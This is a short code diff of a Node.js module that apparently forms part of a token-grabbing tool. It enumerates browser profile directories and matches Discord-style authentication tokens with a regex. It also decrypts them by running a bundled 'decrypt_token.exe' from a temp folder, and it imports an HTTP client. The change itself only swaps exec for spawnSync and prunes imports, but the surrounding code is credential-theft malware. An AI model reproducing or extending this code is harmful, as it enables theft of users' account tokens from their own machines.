@@ -1,10 +1,7 @@
 const { join } = require('path');
 const { roamingAppData, localAppData } = require('../util/variables');
-const { execSync, exec } = require('child_process');
-const { readFileSync, existsSync, readdirSync, createReadStream, writeFileSync, statSync } = require('fs');
-const readline = require('readline');
-const os = require('os');
-const { addDoubleQuotes } = require('../util/string');
+const { execSync, spawnSync } = require('child_process');
+const { readFileSync, existsSync, readdirSync, writeFileSync, statSync } = require('fs');
 const axios = require('axios');
 const { tempFolder } = require('../index');
 const { userAgent } = require('../config');
@@ -38,9 +35,10 @@ const paths = {
   'Iridium': join(localAppData, 'Iridium', 'User Data')
 };
 
-const decryptToken = (token, key) => exec([
-  addDoubleQuotes(join(tempFolder, 'decrypt_token.exe')), '--key', `"${key}"`, '--token', `"${token}"`
-].join(' ')).toString();
+const decryptToken = (token, key) => spawnSync(
+  join(tempFolder, 'decrypt_token.exe'),
+  ['--key', `"${key}"`, '--token', `"${token}"`]
+).stdout.toString();
 
 const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/;
 const decryptRickRoll = (path) => {
